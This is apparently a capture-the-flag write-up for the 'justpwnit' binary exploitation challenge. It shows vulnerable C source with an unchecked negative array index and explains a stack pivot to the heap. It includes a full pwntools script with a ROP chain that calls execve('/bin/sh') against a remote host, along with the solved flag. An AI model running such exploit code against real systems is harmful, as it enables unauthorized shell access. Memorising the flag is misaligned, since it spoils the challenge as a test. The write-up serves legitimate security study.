# justpwnit

## Challenge

The program allows us to write strings to the heap.
Pointers to these strings can be saved in an array at a chosen index.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source code

```c
void set_element(char **parray) {
  int index;
  printf("Index: ");
  if (scanf("%d%*c", &index) != 1)
    exit(1);
  if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))
    exit(1);
  printf("Data: ");
  if (!fgets(parray[index], STR_SIZE, stdin))
    exit(1);
}

void justpwnit() {
  char *array[4];
  for (int i = 0; i < 4; i++) {
    set_element(array);
  }
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(180);
  justpwnit();
  return 0;
}
```

## Solution

There is no bounds checking on the array, so we can overwrite a stored RBP to point at the heap.
Then, after a `ret` and `leave; ret;`, the RSP will be on the heap and the next `ret` will execute our ROP chain.

Unfortunately, `main` has no stack variables, so it has no `leave` in its epilogue.
We cannot use `main` to move our RSP.

`justpwnit` has a `leave` instruction, so we need a `ret` preceding the end of `justpwnit` to set our RBP to a heap address.

Note that `set_element` modifies `array` in `justpwnit`.
We can use a negative index to modify the saved RBP of `set_element`.
`justpwnit` will then `leave; ret;` to set RSP to a heap address and `main` will return into a ROP chain.

We need to use the ROP chain to place "/bin/sh\x00" on the stack and execve it using a syscall.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 168.119.108.148 --port 11010 justpwnit
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('justpwnit')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '168.119.108.148'
port = int(args.PORT or 11010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak*0x0040120d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

movqword_ptrRDI_RAX = 0x0000000000401ce7
binsh = 0x40b000

payload = flat({
    0x8: [
        rop.find_gadget(['ret'])[0],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        binsh,
        rop.find_gadget(['pop rax', 'ret'])[0],
        b"/bin/sh\x00",
        movqword_ptrRDI_RAX,
        rop.find_gadget(['pop rsi', 'ret'])[0],
        0,
        rop.find_gadget(['pop rdx', 'ret'])[0],
        0,
        rop.find_gadget(['pop rax', 'ret'])[0],
        59,
        rop.find_gadget(['syscall'])[0],
        ],
    })

io.sendlineafter(b'Index: ', b'-2')
pause()
io.sendlineafter(b'Data: ', payload)

io.interactive()
```

## Flag

`ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}`

